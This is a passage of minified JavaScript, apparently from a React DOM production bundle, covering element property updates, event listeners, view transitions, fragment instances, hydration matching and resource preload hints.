0)!==a&&(t.innerHTML=a)}}break;case"children":if(typeof r=="string")ns(t,r);else if(typeof r=="number"||typeof r=="bigint")ns(t,""+r);else return;break;case"onScroll":r!=null&&Ee("scroll",t);return;case"onScrollEnd":r!=null&&Ee("scrollend",t);return;case"onClick":r!=null&&(t.onclick=Xi);return;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":return;case"innerText":case"textContent":return;default:if(!vn.hasOwnProperty(a))t:{if(a[0]==="o"&&a[1]==="n"&&(l=a.endsWith("Capture"),u=a.slice(2,l?a.length-7:void 0),n=t[H]||null,n=n!=null?n[a]:null,typeof n=="function"&&t.removeEventListener(u,n,l),typeof r=="function")){typeof n!="function"&&n!==null&&(a in t?t[a]=null:t.hasAttribute(a)&&t.removeAttribute(a)),t.addEventListener(u,r,l);break t}ve=!0,a in t?t[a]=r:r===!0?t.setAttribute(a,""):je(t,a,r)}return}ve=!0}function Nn(t,n,a){switch(n){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":Ee("error",t),Ee("load",t);var r=!1,l=!1,u;for(u in a)if(a.hasOwnProperty(u)){var g=a[u];if(g!=null)switch(u){case"src":r=!0;break;case"srcSet":l=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(s(137,n));default:We(t,n,u,g,a,null)}}l&&We(t,n,"srcSet",a.srcSet,a,null),r&&We(t,n,"src",a.src,a,null);return;case"input":Ee("invalid",t);var R=u=g=l=null,I=null,Q=null;for(r in a)if(a.hasOwnProperty(r)){var ct=a[r];if(ct!=null)switch(r){case"name":l=ct;break;case"type":g=ct;break;case"checked":I=ct;break;case"defaultChecked":Q=ct;break;case"value":u=ct;break;case"defaultValue":R=ct;break;case"children":case"dangerouslySetInnerHTML":if(ct!=null)throw Error(s(137,n));break;default:We(t,n,r,ct,a,null)}}um(t,u,R,I,Q,g,l,!1);return;case"select":Ee("invalid",t),r=g=u=null;for(l in a)if(a.hasOwnProperty(l)&&(R=a[l],R!=null))switch(l){case"value":u=R;break;case"defaultValue":g=R;break;case"multiple":r=R;default:We(t,n,l,R,a,null)}n=u,a=g,t.multiple=!!r,n!=null?es(t,!!r,n,!1):a!=null&&es(t,!!r,a,!0);return;case"textarea":Ee("invalid",t),u=l=r=null;for(g in a)if(a.hasOwnProperty(g)&&(R=a[g],R!=null))switch(g){case"value":r=R;break;case"defaultValue":l=R;break;case"children":u=R;break;case"dangerouslySetInnerHTML":if(R!=null)throw Error(s(91));break;default:We(t,n,g,R,a,null)}dm(t,r,l,u);return;case"option":for(I in a)if(a.hasOwnProperty(I)&&(r=a[I],r!=null))switch(I){case"selected":t.selected=r&&typeof r!="function"&&typeof r!="symbol";break;default:We(t,n,I,r,a,null)}return;case"dialog":Ee("beforetoggle",t),Ee("toggle",t),Ee("cancel",t),Ee("close",t);break;case"iframe":case"object":Ee("load",t);break;case"video":case"audio":for(r=0;r<Yo.length;r++)Ee(Yo[r],t);break;case"image":Ee("error",t),Ee("load",t);break;case"details":Ee("toggle",t);break;case"embed":case"source":case"link":Ee("error",t),Ee("load",t);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(Q in a)if(a.hasOwnProperty(Q)&&(r=a[Q],r!=null))switch(Q){case"children":case"dangerouslySetInnerHTML":throw Error(s(137,n));default:We(t,n,Q,r,a,null)}return;default:if(ku(n)){for(ct in a)a.hasOwnProperty(ct)&&(r=a[ct],r!==void 0&&Xd(t,n,ct,r,a,void 0));return}}for(R in a)a.hasOwnProperty(R)&&(r=a[R],r!=null&&We(t,n,R,r,a,null))}var lM={};function cM(t,n,a,r){switch(n){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var l=null,u=null,g=null,R=null,I=null,Q=null,ct=null;for(st in a){var yt=a[st];if(a.hasOwnProperty(st)&&yt!=null)switch(st){case"checked":break;case"value":break;case"defaultValue":I=yt;default:r.hasOwnProperty(st)||We(t,n,st,null,r,yt)}}for(var Z in r){var st=r[Z];if(yt=a[Z],r.hasOwnProperty(Z)&&(st!=null||yt!=null))switch(Z){case"type":st!==yt&&(ve=!0),u=st;break;case"name":st!==yt&&(ve=!0),l=st;break;case"checked":st!==yt&&(ve=!0),Q=st;break;case"defaultChecked":st!==yt&&(ve=!0),ct=st;break;case"value":st!==yt&&(ve=!0),g=st;break;case"defaultValue":st!==yt&&(ve=!0),R=st;break;case"children":case"dangerouslySetInnerHTML":if(st!=null)throw Error(s(137,n));break;default:st!==yt&&We(t,n,Z,st,r,yt)}}Vu(t,g,R,I,Q,ct,u,l);return;case"select":st=g=R=Z=null;for(u in a)if(I=a[u],a.hasOwnProperty(u)&&I!=null)switch(u){case"value":break;case"multiple":st=I;default:r.hasOwnProperty(u)||We(t,n,u,null,r,I)}for(l in r)if(u=r[l],I=a[l],r.hasOwnProperty(l)&&(u!=null||I!=null))switch(l){case"value":u!==I&&(ve=!0),Z=u;break;case"defaultValue":u!==I&&(ve=!0),R=u;break;case"multiple":u!==I&&(ve=!0),g=u;default:u!==I&&We(t,n,l,u,r,I)}n=R,a=g,r=st,Z!=null?es(t,!!a,Z,!1):!!r!=!!a&&(n!=null?es(t,!!a,n,!0):es(t,!!a,a?[]:"",!1));return;case"textarea":st=Z=null;for(R in a)if(l=a[R],a.hasOwnProperty(R)&&l!=null&&!r.hasOwnProperty(R))switch(R){case"value":break;case"children":break;default:We(t,n,R,null,r,l)}for(g in r)if(l=r[g],u=a[g],r.hasOwnProperty(g)&&(l!=null||u!=null))switch(g){case"value":l!==u&&(ve=!0),Z=l;break;case"defaultValue":l!==u&&(ve=!0),st=l;break;case"children":break;case"dangerouslySetInnerHTML":if(l!=null)throw Error(s(91));break;default:l!==u&&We(t,n,g,l,r,u)}fm(t,Z,st);return;case"option":for(var It in a)if(Z=a[It],a.hasOwnProperty(It)&&Z!=null&&!r.hasOwnProperty(It))switch(It){case"selected":t.selected=!1;break;default:We(t,n,It,null,r,Z)}for(I in r)if(Z=r[I],st=a[I],r.hasOwnProperty(I)&&Z!==st&&(Z!=null||st!=null))switch(I){case"selected":Z!==st&&(ve=!0),t.selected=Z&&typeof Z!="function"&&typeof Z!="symbol";break;default:We(t,n,I,Z,r,st)}return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var Qt in a)Z=a[Qt],a.hasOwnProperty(Qt)&&Z!=null&&!r.hasOwnProperty(Qt)&&We(t,n,Qt,null,r,Z);for(Q in r)if(Z=r[Q],st=a[Q],r.hasOwnProperty(Q)&&Z!==st&&(Z!=null||st!=null))switch(Q){case"children":case"dangerouslySetInnerHTML":if(Z!=null)throw Error(s(137,n));break;default:We(t,n,Q,Z,r,st)}return;default:if(ku(n)){for(var pe in a)Z=a[pe],a.hasOwnProperty(pe)&&Z!==void 0&&!r.hasOwnProperty(pe)&&Xd(t,n,pe,void 0,r,Z);for(ct in r)Z=r[ct],st=a[ct],!r.hasOwnProperty(ct)||Z===st||Z===void 0&&st===void 0||Xd(t,n,ct,Z,r,st);return}}for(var K in a)Z=a[K],a.hasOwnProperty(K)&&Z!=null&&!r.hasOwnProperty(K)&&We(t,n,K,null,r,Z);for(yt in r)Z=r[yt],st=a[yt],!r.hasOwnProperty(yt)||Z===st||Z==null&&st==null||We(t,n,yt,Z,r,st)}function S_(t){switch(t){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function uM(){if(typeof performance.getEntriesByType=="function"){for(var t=0,n=0,a=performance.getEntriesByType("resource"),r=0;r<a.length;r++){var l=a[r],u=l.transferSize,g=l.initiatorType,R=l.duration;if(u&&R&&S_(g)){for(g=0,R=l.responseEnd,r+=1;r<a.length;r++){var I=a[r],Q=I.startTime;if(Q>R)break;var ct=I.transferSize,yt=I.initiatorType;ct&&S_(yt)&&(I=I.responseEnd,g+=ct*(I<R?1:(R-Q)/(I-Q)))}if(--r,n+=8*(u+g)/(l.duration/1e3),t++,10<t)break}}if(0<t)return n/t/1e6}return navigator.connection&&(t=navigator.connection.downlink,typeof t=="number")?t:5}var kd=null,Wd=null;function Ko(t){return t.nodeType===9?t:t.ownerDocument}function y_(t){switch(t){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function M_(t,n){if(t===0)switch(n){case"svg":return 1;case"math":return 2;default:return 0}return t===1&&n==="foreignObject"?0:t}function E_(t,n,a,r){return a=Ko(a).createElement(t),a[A]=r,a[H]=n,Nn(a,t,n),_e(a),a}function qd(t,n){return t==="textarea"||t==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.children=="bigint"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Yd=null;function fM(){var t=window.event;return t&&t.type==="popstate"?t===Yd?!1:(Yd=t,!0):(Yd=null,!1)}var Zd=typeof setTimeout=="function"?setTimeout:void 0,dM=typeof clearTimeout=="function"?clearTimeout:void 0,b_=typeof Promise=="function"?Promise:void 0,T_=typeof requestAnimationFrame=="function"?requestAnimationFrame:Zd,hM=typeof queueMicrotask=="function"?queueMicrotask:typeof b_<"u"?function(t){return b_.resolve(null).then(t).catch(pM)}:Zd;function pM(t){setTimeout(function(){throw t})}function ar(t){return t==="head"}function A_(t,n){var a=n,r=0;do{var l=a.nextSibling;if(t.removeChild(a),l&&l.nodeType===8)if(a=l.data,a==="/$"||a==="/&"){if(r===0){t.removeChild(l),Fs(n);return}r--}else if(a==="$"||a==="$?"||a==="$~"||a==="$!"||a==="&")r++;else if(a==="html")nh(t.ownerDocument.documentElement);else if(a==="head"){a=t.ownerDocument.head,nh(a);for(var u=a.firstChild;u;){var g=u.nextSibling,R=u.nodeName;u[Pt]||R==="SCRIPT"||R==="STYLE"||R==="LINK"&&u.rel.toLowerCase()==="stylesheet"||a.removeChild(u),u=g}}else a==="body"&&nh(t.ownerDocument.body);a=l}while(a);Fs(n)}function R_(t,n){var a=t;t=0;do{var r=a.nextSibling;if(a.nodeType===1?n?(a._stashedDisplay=a.style.display,a.style.display="none"):(a.style.display=a._stashedDisplay||"",a.getAttribute("style")===""&&a.removeAttribute("style")):a.nodeType===3&&(n?(a._stashedText=a.nodeValue,a.nodeValue=""):a.nodeValue=a._stashedText||""),r&&r.nodeType===8)if(a=r.data,a==="/$"){if(t===0)break;t--}else a!=="$"&&a!=="$?"&&a!=="$~"&&a!=="$!"||t++;a=r}while(a)}function C_(t,n,a){if(n=CSS.escape(n)!==n?"r-"+btoa(n).replace(/=/g,""):n,t.style.viewTransitionName=n,a!=null&&(t.style.viewTransitionClass=a),a=getComputedStyle(t),a.display==="inline"){if(n=t.getClientRects(),n.length===1)var r=1;else for(var l=r=0;l<n.length;l++){var u=n[l];0<u.width&&0<u.height&&r++}r===1&&(t=t.style,t.display=n.length===1?"inline-block":"block",t.marginTop="-"+a.paddingTop,t.marginBottom="-"+a.paddingBottom)}}function w_(t,n){t=t.style,n=n.style;var a=n!=null?n.hasOwnProperty("viewTransitionName")?n.viewTransitionName:n.hasOwnProperty("view-transition-name")?n["view-transition-name"]:null:null;t.viewTransitionName=a==null||typeof a=="boolean"?"":(""+a).trim(),a=n!=null?n.hasOwnProperty("viewTransitionClass")?n.viewTransitionClass:n.hasOwnProperty("view-transition-class")?n["view-transition-class"]:null:null,t.viewTransitionClass=a==null||typeof a=="boolean"?"":(""+a).trim(),t.display==="inline-block"&&(n==null?t.display=t.margin="":(a=n.display,t.display=a==null||typeof a=="boolean"?"":a,a=n.margin,a!=null?t.margin=a:(a=n.hasOwnProperty("marginTop")?n.marginTop:n["margin-top"],t.marginTop=a==null||typeof a=="boolean"?"":a,n=n.hasOwnProperty("marginBottom")?n.marginBottom:n["margin-bottom"],t.marginBottom=n==null||typeof n=="boolean"?"":n)))}function mM(t,n,a){return a=a.ownerDocument.defaultView,{rect:t,abs:n.position==="absolute"||n.position==="fixed",clip:n.clipPath!=="none"||n.overflow!=="visible"||n.filter!=="none"||n.mask!=="none"||n.mask!=="none"||n.borderRadius!=="0px",view:0<=t.bottom&&0<=t.right&&t.top<=a.innerHeight&&t.left<=a.innerWidth}}function Kd(t){var n=t.getBoundingClientRect(),a=getComputedStyle(t);return mM(n,a,t)}function gM(t){return t.documentElement.clientHeight}function _M(t){this.addEventListener("load",t),this.addEventListener("error",t)}function vM(t,n,a,r,l,u,g,R,I){var Q=n.nodeType===9?n:n.ownerDocument;try{var ct=Q.startViewTransition({update:function(){var Z=Q.defaultView,st=Z.navigation&&Z.navigation.transition,It=Q.fonts.status;r();var Qt=[];if(It==="loaded"&&(gM(Q),Q.fonts.status==="loading"&&Qt.push(Q.fonts.ready)),It=Qt.length,t!==null)for(var pe=t.suspenseyImages,K=0,G=0;G<pe.length;G++){var nt=pe[G];if(!nt.complete){var St=nt.getBoundingClientRect();if(0<St.bottom&&0<St.right&&St.top<Z.innerHeight&&St.left<Z.innerWidth){if(K+=j_(nt),K>Bc){Qt.length=It;break}nt=new Promise(_M.bind(nt)),Qt.push(nt)}}}if(0<Qt.length)return Z=Promise.race([Promise.all(Qt),new Promise(function(Zt){return setTimeout(Zt,500)})]).then(l,l),(st?Promise.allSettled([st.finished,Z]):Z).then(u,u);if(l(),st)return st.finished.then(u,u);u()},types:a});Q.__reactViewTransition=ct;var yt=[];return ct.ready.then(function(){for(var Z=Q.documentElement.getAnimations({subtree:!0}),st=0;st<Z.length;st++){var It=Z[st],Qt=It.effect,pe=Qt.pseudoElement;if(pe!=null&&pe.startsWith("::view-transition")){yt.push(It),It=Qt.getKeyframes();for(var K=pe=void 0,G=!0,nt=0;nt<It.length;nt++){var St=It[nt],Zt=St.width;if(pe===void 0)pe=Zt;else if(pe!==Zt){G=!1;break}if(Zt=St.height,K===void 0)K=Zt;else if(K!==Zt){G=!1;break}delete St.width,delete St.height,St.transform==="none"&&delete St.transform}G&&pe!==void 0&&K!==void 0&&(Qt.setKeyframes(It),G=getComputedStyle(Qt.target,Qt.pseudoElement),G.width!==pe||G.height!==K)&&(G=It[0],G.width=pe,G.height=K,G=It[It.length-1],G.width=pe,G.height=K,Qt.setKeyframes(It))}}g()},function(Z){Q.__reactViewTransition===ct&&(Q.__reactViewTransition=null);try{if(typeof Z=="object"&&Z!==null)switch(Z.name){case"InvalidStateError":(Z.message==="View transition was skipped because document visibility state is hidden."||Z.message==="Skipping view transition because document visibility state has become hidden."||Z.message==="Skipping view transition because viewport size changed."||Z.message==="Transition was aborted because of invalid state")&&(Z=null)}Z!==null&&I(Z)}finally{r(),l(),g()}}),ct.finished.finally(function(){for(var Z=0;Z<yt.length;Z++)yt[Z].cancel();Q.__reactViewTransition===ct&&(Q.__reactViewTransition=null),R()}),ct}catch{return r(),l(),g(),null}}function Fr(t,n){this._scope=document.documentElement,this._selector="::view-transition-"+t+"("+n+")"}Fr.prototype.animate=function(t,n){return n=typeof n=="number"?{duration:n}:P({},n),n.pseudoElement=this._selector,this._scope.animate(t,n)},Fr.prototype.getAnimations=function(){for(var t=this._scope,n=this._selector,a=t.getAnimations({subtree:!0}),r=[],l=0;l<a.length;l++){var u=a[l].effect;u!==null&&u.target===t&&u.pseudoElement===n&&r.push(a[l])}return r},Fr.prototype.getComputedStyle=function(){return getComputedStyle(this._scope,this._selector)};function N_(t){return{name:t,group:new Fr("group",t),imagePair:new Fr("image-pair",t),old:new Fr("old",t),new:new Fr("new",t)}}function ci(t){this._fragmentFiber=t,this._observers=this._eventListeners=null}ci.prototype.addEventListener=function(t,n,a){var r=null,l=null;if(!(a!=null&&typeof a!="boolean"&&(r=a.signal||null,r!==null&&r.aborted))){this._eventListeners===null&&(this._eventListeners=[]);var u=this._eventListeners;if(U_(u,t,n,a)===-1){var g=this,R=n;a!=null&&typeof a!="boolean"&&a.once===!0&&(R=function(I){g.removeEventListener(t,n,a),typeof n=="function"?n.call(this,I):n.handleEvent(I)}),r!==null&&(l=g.removeEventListener.bind(g,t,n,a),r.addEventListener("abort",l,{once:!0}),l=r.removeEventListener.bind(r,"abort",l)),r=Ls(a),u.push({type:t,listener:n,optionsOrUseCapture:a,attachedListener:R,cleanup:l}),v(this._fragmentFiber.child,!1,xM,t,R,r)}this._eventListeners=u}};function xM(t,n,a,r){return y(t).addEventListener(n,a,r),!1}ci.prototype.removeEventListener=function(t,n,a){var r=this._eventListeners;if(r!==null&&(n=U_(r,t,n,a),n!==-1)){var l=r[n];a=l.attachedListener;var u=l.cleanup;l=Ls(l.optionsOrUseCapture),v(this._fragmentFiber.child,!1,SM,t,a,l),r.splice(n,1),u!==null&&u()}};function SM(t,n,a,r){return y(t).removeEventListener(n,a,r),!1}function Ls(t){return t!=null&&typeof t!="boolean"&&(t.once===!0||t.signal instanceof AbortSignal)?{capture:t.capture,passive:t.passive}:t}function D_(t){return t==null?"c=0":typeof t=="boolean"?"c="+(t?"1":"0"):"c="+(t.capture?"1":"0")}function U_(t,n,a,r){if(t.length===0)return-1;r=D_(r);for(var l=0;l<t.length;l++){var u=t[l];if(u.type===n&&u.listener===a&&D_(u.optionsOrUseCapture)===r)return l}return-1}ci.prototype.dispatchEvent=function(t){var n=_(this._fragmentFiber);if(n===null)return!0;n=y(n);var a=this._eventListeners;if(a!==null&&0<a.length||!t.bubbles){var r=n.nodeType===9?n.createComment(""):document.createTextNode("");if(a)for(var l=0;l<a.length;l++){var u=a[l];r.addEventListener(u.type,u.attachedListener,Ls(u.optionsOrUseCapture))}if(n.appendChild(r),t=r.dispatchEvent(t),a)for(l=0;l<a.length;l++)u=a[l],r.removeEventListener(u.type,u.attachedListener,Ls(u.optionsOrUseCapture));return n.removeChild(r),t}return n.dispatchEvent(t)},ci.prototype.focus=function(t){v(this._fragmentFiber.child,!0,L_,t,void 0,void 0)};function L_(t,n){return t.tag===6?!1:(t=y(t),UM(t,n))}ci.prototype.focusLast=function(t){var n=[];v(this._fragmentFiber.child,!0,jd,n,void 0,void 0);for(var a=n.length-1;0<=a&&!L_(n[a],t);a--);};function jd(t,n){return n.push(t),!1}ci.prototype.blur=function(){var t=_(this._fragmentFiber);t!==null&&(t=y(t),t=Ko(t).activeElement,t!==null&&v(this._fragmentFiber.child,!1,yM,t,void 0,void 0))};function yM(t,n){return t.tag===6?!1:(t=y(t),t===n||t.contains(n)?(n.blur(),!0):!1)}ci.prototype.observeUsing=function(t){this._observers===null&&(this._observers=new Set),this._observers.add(t),v(this._fragmentFiber.child,!1,MM,t,void 0,void 0)};function MM(t,n){return t.tag===6||(t=y(t),n.observe(t)),!1}ci.prototype.unobserveUsing=function(t){var n=this._observers;if(n!==null&&n.has(t)){n.delete(t),v(this._fragmentFiber.child,!1,EM,t,void 0,void 0);for(var a=n=0;a<Ui.length;a++){var r=Ui[a];r.fragmentInstance===this&&r.observer===t?t.unobserve(r.instance):Ui[n++]=r}Ui.length=n}};function EM(t,n){return t.tag===6||(t=y(t),n.unobserve(t)),!1}var Ui=[],Qd=!1;function bM(t,n,a){Ui.push({fragmentInstance:t,observer:n,instance:a}),Qd||(Qd=!0,LM(function(){Qd=!1;var r=Ui;Ui=[];for(var l=0;l<r.length;l++){var u=r[l];u.observer.unobserve(u.instance)}}))}ci.prototype.getClientRects=function(){var t=[];return v(this._fragmentFiber.child,!1,TM,t,void 0,void 0),t};function TM(t,n){if(t.tag===6){t=t.stateNode;var a=t.ownerDocument.createRange();a.selectNodeContents(t),n.push.apply(n,a.getClientRects())}else t=y(t),n.push.apply(n,t.getClientRects());return!1}ci.prototype.getRootNode=function(t){var n=_(this._fragmentFiber);return n===null?this:y(n).getRootNode(t)},ci.prototype.compareDocumentPosition=function(t){var n=_(this._fragmentFiber);if(n===null)return Node.DOCUMENT_POSITION_DISCONNECTED;var a=[];v(this._fragmentFiber.child,!1,jd,a,void 0,void 0);var r=y(n);if(a.length===0){if(a=r,E(this._fragmentFiber)){t:{for(n=this._fragmentFiber.return;n!==null;){if(n.tag===4){n=n.stateNode.containerInfo;break t}if(n.tag===3||n.tag===5||n.tag===27)break;n=n.return}n=null}n!=null&&(a=n)}n=this._fragmentFiber;var l=r=a.compareDocumentPosition(t);return a===t?l=Node.DOCUMENT_POSITION_CONTAINS:r&Node.DOCUMENT_POSITION_CONTAINED_BY&&(a=T(n)[1],a===null?l=Node.DOCUMENT_POSITION_PRECEDING:(t=y(a).compareDocumentPosition(t),l=t===0||t&Node.DOCUMENT_POSITION_FOLLOWING?Node.DOCUMENT_POSITION_FOLLOWING:Node.DOCUMENT_POSITION_PRECEDING)),l|=Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC}n=y(a[0]),l=y(a[a.length-1]);var u=E(this._fragmentFiber)?n.parentElement:r;if(u==null)return Node.DOCUMENT_POSITION_DISCONNECTED;r=u.compareDocumentPosition(n)&Node.DOCUMENT_POSITION_CONTAINED_BY,u=u.compareDocumentPosition(l)&Node.DOCUMENT_POSITION_CONTAINED_BY;var g=n.compareDocumentPosition(t),R=l.compareDocumentPosition(t),I=g&Node.DOCUMENT_POSITION_CONTAINED_BY||R&Node.DOCUMENT_POSITION_CONTAINED_BY;return R=r&&u&&g&Node.DOCUMENT_POSITION_FOLLOWING&&R&Node.DOCUMENT_POSITION_PRECEDING,n=r&&n===t||u&&l===t||I||R?Node.DOCUMENT_POSITION_CONTAINED_BY:!r&&n===t||!u&&l===t?Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC:g,n&Node.DOCUMENT_POSITION_DISCONNECTED||n&Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC||AM(n,this._fragmentFiber,a[0],a[a.length-1],t)?n:Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC};function AM(t,n,a,r,l){var u=re(l);if(t&Node.DOCUMENT_POSITION_CONTAINED_BY){if(a=!!u)t:{for(;u!==null;){if(u.tag===7&&(u===n||u.alternate===n)){a=!0;break t}u=u.return}a=!1}return a}if(t&Node.DOCUMENT_POSITION_CONTAINS){if(u===null)return u=l.ownerDocument,l===u||l===u.documentElement||l===u.body;t:{for(u=n,n=_(n);u!==null;){if(!(u.tag!==5&&u.tag!==3&&u.tag!==27||u!==n&&u.alternate!==n)){u=!0;break t}u=u.return}u=!1}return u}return t&Node.DOCUMENT_POSITION_PRECEDING?((n=!!u)&&!(n=u===a)&&(n=D(a,u,U),n===null?n=!1:(v(n,!0,B,u,a),u=S,S=null,n=u!==null)),n):t&Node.DOCUMENT_POSITION_FOLLOWING?((n=!!u)&&!(n=u===r)&&(n=D(r,u,U),n===null?n=!1:(v(n,!0,C,u,r),u=S,N=S=null,n=u!==null)),n):!1}function O_(t,n){var a=t.ownerDocument.createRange();a.selectNodeContents(t),t=a.getBoundingClientRect(),window.scrollTo(window.scrollX+t.left,n?window.scrollY+t.top:window.scrollY+t.bottom-window.innerHeight)}ci.prototype.scrollIntoView=function(t){if(typeof t=="object")throw Error(s(566));var n=[];v(this._fragmentFiber.child,!1,jd,n,void 0,void 0);var a=t!==!1;if(n.length===0){var r=T(this._fragmentFiber);if(r=a?r[1]||r[0]||_(this._fragmentFiber):r[0]||r[1],r===null)return;if(r.tag===6){t=y(r),O_(t,a);return}if(r=y(r),r.nodeType!==9){if(r.nodeType===11){a="host"in r?r.host:null,a!==null&&a.scrollIntoView(t);return}r.scrollIntoView(t)}}for(r=a?n.length-1:0;r!==(a?-1:n.length);){var l=n[r];l.tag===6?(l=y(l),O_(l,a)):y(l).scrollIntoView(t),r+=a?-1:1}};function RM(t,n){return t=y(t),P_(t,n),!1}function P_(t,n){t.reactFragments==null&&(t.reactFragments=new Set),t.reactFragments.add(n)}function I_(t,n){var a=n._eventListeners;if(a!==null)for(var r=0;r<a.length;r++){var l=a[r];t.addEventListener(l.type,l.attachedListener,Ls(l.optionsOrUseCapture))}t.nodeType!==3&&(a=n._observers,a!==null&&a.forEach(function(u){for(var g=0,R=0;R<Ui.length;R++){var I=Ui[R];(I.fragmentInstance!==n||I.observer!==u||I.instance!==t)&&(Ui[g++]=I)}Ui.length=g,u.observe(t)}),P_(t,n))}function CM(t,n){var a=n._eventListeners;if(a!==null)for(var r=0;r<a.length;r++){var l=a[r];t.removeEventListener(l.type,l.attachedListener,Ls(l.optionsOrUseCapture))}t.nodeType!==3&&(a=n._observers,a!==null&&a.forEach(function(u){typeof u.rootMargin=="string"?bM(n,u,t):u.unobserve(t)}),t.reactFragments!=null&&t.reactFragments.delete(n))}function Jd(t){var n=t.firstChild;for(n&&n.nodeType===10&&(n=n.nextSibling);n;){var a=n;switch(n=n.nextSibling,a.nodeName){case"HTML":case"HEAD":case"BODY":Jd(a),jt(a);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(a.rel.toLowerCase()==="stylesheet")continue}t.removeChild(a)}}function wM(t,n,a,r){for(;t.nodeType===1;){var l=a;if(t.nodeName.toLowerCase()!==n.toLowerCase()){if(!r&&(t.nodeName!=="INPUT"||t.type!=="hidden"))break}else if(r){if(!t[Pt])switch(n){case"meta":if(!t.hasAttribute("itemprop"))break;return t;case"link":if(u=t.getAttribute("rel"),u==="stylesheet"&&t.hasAttribute("data-precedence"))break;if(u!==l.rel||t.getAttribute("href")!==(l.href==null||l.href===""?null:l.href)||t.getAttribute("crossorigin")!==(l.crossOrigin==null?null:l.crossOrigin)||t.getAttribute("title")!==(l.title==null?null:l.title))break;return t;case"style":if(t.hasAttribute("data-precedence"))break;return t;case"script":if(u=t.getAttribute("src"),(u!==(l.src==null?null:l.src)||t.getAttribute("type")!==(l.type==null?null:l.type)||t.getAttribute("crossorigin")!==(l.crossOrigin==null?null:l.crossOrigin))&&u&&t.hasAttribute("async")&&!t.hasAttribute("itemprop"))break;return t;default:return t}}else if(n==="input"&&t.type==="hidden"){var u=l.name==null?null:""+l.name;if(l.type==="hidden"&&t.getAttribute("name")===u)return t}else return t;if(t=yi(t.nextSibling),t===null)break}return null}function NM(t,n,a){if(n==="")return null;for(;t.nodeType!==3;)if((t.nodeType!==1||t.nodeName!=="INPUT"||t.type!=="hidden")&&!a||(t=yi(t.nextSibling),t===null))return null;return t}function z_(t,n){for(;t.nodeType!==8;)if((t.nodeType!==1||t.nodeName!=="INPUT"||t.type!=="hidden")&&!n||(t=yi(t.nextSibling),t===null))return null;return t}function $d(t){return t.data==="$?"||t.data==="$~"}function th(t){return t.data==="$!"||t.data==="$?"&&t.ownerDocument.readyState!=="loading"}function DM(t,n){var a=t.ownerDocument;if(t.data==="$~")t._reactRetry=n;else if(t.data!=="$?"||a.readyState!=="loading")n();else{var r=function(){n(),a.removeEventListener("DOMContentLoaded",r)};a.addEventListener("DOMContentLoaded",r),t._reactRetry=r}}function yi(t){for(;t!=null;t=t.nextSibling){var n=t.nodeType;if(n===1||n===3)break;if(n===8){if(n=t.data,n==="$"||n==="$!"||n==="$?"||n==="$~"||n==="&"||n==="F!"||n==="F")break;if(n==="/$"||n==="/&")return null}}return t}var eh=null;function B_(t){t=t.nextSibling;for(var n=0;t;){if(t.nodeType===8){var a=t.data;if(a==="/$"||a==="/&"){if(n===0)return yi(t.nextSibling);n--}else a!=="$"&&a!=="$!"&&a!=="$?"&&a!=="$~"&&a!=="&"||n++}t=t.nextSibling}return null}function F_(t){t=t.previousSibling;for(var n=0;t;){if(t.nodeType===8){var a=t.data;if(a==="$"||a==="$!"||a==="$?"||a==="$~"||a==="&"){if(n===0)return t;n--}else a!=="/$"&&a!=="/&"||n++}t=t.previousSibling}return null}function UM(t,n){function a(){r=!0}if(t.ownerDocument.activeElement===t)return!0;var r=!1;try{t.ownerDocument.addEventListener("focus",a,!0),(t.focus||HTMLElement.prototype.focus).call(t,n)}finally{t.ownerDocument.removeEventListener("focus",a,!0)}return r}function LM(t){T_(function(){T_(function(n){return t(n)})})}function H_(t,n,a){switch(n=Ko(a),t){case"html":if(t=n.documentElement,!t)throw Error(s(452));return t;case"head":if(t=n.head,!t)throw Error(s(453));return t;case"body":if(t=n.body,!t)throw Error(s(454));return t;default:throw Error(s(451))}}function G_(t,n,a){for(var r in a){var l=a[r];a.hasOwnProperty(r)&&l!=null&&We(t,n,r,null,lM,l)}a.dangerouslySetInnerHTML!=null&&(t.textContent=""),t.onclick===Xi&&(t.onclick=null),jt(t)}function nh(t){for(var n=t.attributes;n.length;)t.removeAttributeNode(n[0]);jt(t)}var Mi=new Map,V_=new Set;function jo(t){if(typeof t.getRootNode=="function"){var n=t.getRootNode();if(n.nodeType===9||n.nodeType===11)return n}return t.nodeType===9?t:t.ownerDocument}var Ea=Rt.d;Rt.d={f:OM,r:PM,D:IM,C:zM,L:BM,m:FM,X:GM,S:HM,M:VM};function OM(){var t=Ea.f(),n=wc();return t||n}function PM(t){var n=fe(t);n!==null&&n.tag===5&&n.type==="form"?k0(n):Ea.r(t)}var Os=typeof document>"u"?null:document;function X_(t,n,a){var r=Os;if(r&&typeof n=="string"&&n){var l=pi(n);l='link[rel="'+t+'"][href="'+l+'"]',typeof a=="string"&&(l+='[crossorigin="'+a+'"]'),V_.has(l)||(V_.add(l),t={rel:t,crossOrigin:a,href:n},r.querySelector(l)===null&&(n=r.createElement("link"),Nn(n,"link",t),_e(n),r.head.appendChild(n)))}}function IM(t){Ea.D(t),X_("dns-prefetch",t,null)}function zM(t,n){Ea.C(t,n),X_("preconnect",t,n)}function BM(t,n,a){Ea.L(t,n,a);var r=Os;if(r&&t&&n){var l='link[rel="preload"][as="'+pi(n)+'"]';n==="image"&&a&&a.imageSrcSet?(l+='[imagesrcset="'+pi(a.imageSrcSet)+'"]',typeof a.imageSizes=="string"&&(l+='[imagesizes="'+pi(a.imageSizes)+'"]')):l+='[href="'+pi(t)+'"]';var 